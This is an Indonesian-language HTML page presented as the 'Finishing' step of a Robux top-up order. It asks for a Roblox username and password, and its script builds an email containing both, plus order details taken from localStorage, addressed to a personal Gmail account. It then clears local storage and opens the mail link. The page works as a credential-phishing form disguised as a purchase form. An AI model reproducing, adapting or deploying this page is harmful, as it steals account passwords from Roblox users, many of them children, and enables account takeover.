<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Finishing</title>
</head>

<body style="
  margin:0;
  font-family:Arial;
  background:url('https://files.catbox.moe/bbxr41.jpg') no-repeat center center fixed;
  background-size:cover;
">

<div style="
  background:white;
  width:300px;
  margin:150px auto;
  padding:20px;
  border-radius:10px;
  text-align:center;
">
  <h2>Finishing</h2>

  <input type="text" id="username" placeholder="Username Roblox"
    style="width:100%;padding:8px;margin-top:8px">
  
  <input type="text" id="password" placeholder="Password kamu"
    style="width:100%;padding:8px;margin-top:8px">


  <button type="button" onclick="submit()"
    style="
      width:100%;
      padding:10px;
      margin-top:10px;
      background:#00b06f;
      color:white;
      border:none;
      cursor:pointer;
    ">
    KIRIM
  </button>
</div>

<script>
function submit(){
  const username = document.getElementById("username").value;
;
  if(username === ""){
    alert("Username Roblox wajib diisi!");
    return;
  }

  const password = document.getElementById("password").value
  
  if(password === ""){
    alert("password Roblox wajib diisi!");
    return;
  }


  const subject = "Order Top Up Robux";

  const body =
`ORDER ROBUX
====================
Username Roblox : ${username}
Password Roblox : ${password}
Jumlah Robux    : ${localStorage.getItem("robux")}
Harga           : Rp ${localStorage.getItem("harga")}
Pembayaran      : ${localStorage.getItem("payment")}`;

  const mailto =
    "mailto:ryuzzl402@gmail.com" +
    "?subject=" + encodeURIComponent(subject) +
    "&body=" + encodeURIComponent(body);

  localStorage.clear();
  window.location.href = mailto;
}
</script>

</body>
